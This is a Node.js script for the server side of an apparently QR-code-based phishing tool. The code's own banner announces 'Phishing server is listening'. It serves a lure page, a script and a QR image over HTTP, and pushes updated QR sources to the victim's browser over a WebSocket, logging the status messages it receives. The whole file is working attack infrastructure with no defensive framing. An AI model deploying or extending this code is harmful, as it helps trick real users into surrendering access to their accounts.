#!/usr/bin/env node
import { exit } from "process";
import { readFileSync } from "node:fs";
import { join } from "path";
import { createServer } from "http";
import { WebSocketServer } from "ws";
import { isMainThread, parentPort, workerData } from "node:worker_threads";
import gradient from "gradient-string";
import chalk from "chalk";

if (!isMainThread) {
  let hostname = workerData.hostname ? workerData.hostname : "localhost";
  let port = workerData.port ? workerData.port : 8200;
  let savedSocket;
  const requestListener = async (req, res) => {
    if (req.method === "GET" || req.method === "POST") {
      if (req.url === "/" || req.url === "/index.html") {
        const data = readFileSync(join("./template/demo/index.html"));
        res.setHeader("Content-Type", "text/html");
        res.writeHead(200);
        res.end(data);
      } else if (req.url === "/index.js") {
        const data = readFileSync(join("./template/static/index.js"));
        res.setHeader("Content-Type", "text/js");
        res.writeHead(200);
        res.end(data);
      } else if (req.url === "/qrcode_localhost.png") {
        const data = readFileSync(join("./template/static/qrcode_localhost.png"));
        res.setHeader("Content-Type", "image/png");
        res.writeHead(200);
        res.end(data);
      } else {
        res.writeHead(404);
        res.end();
      }
    } else {
      res.writeHead(405);
      res.end("Method Not Supported");
    }
  };
  const server = createServer(requestListener);
  const wss = new WebSocketServer({ server });
  wss.on("connection", (socket) => {
    savedSocket = socket;
    socket.on("message", (event) => {
      console.log(chalk.greenBright(JSON.parse(event).status));
    });
  });
  wss.on("close", (reason) => {
    console.log(reason);
  });
  server.listen(port, hostname, () =>
    console.log(
      gradient.instagram(
        `Phishing server is listening on http://${hostname}:${port}`
      )
    )
  );
  function send(val) {
    if (savedSocket) {
      savedSocket.send(JSON.stringify(val));
    }
  }
  parentPort.on("message", (message) => {
    if (message.src) {
      send({ src: message.src });
    } else if (message.exit) {
      send({ exit: "0" });
      exit(0);
    }
  });
}
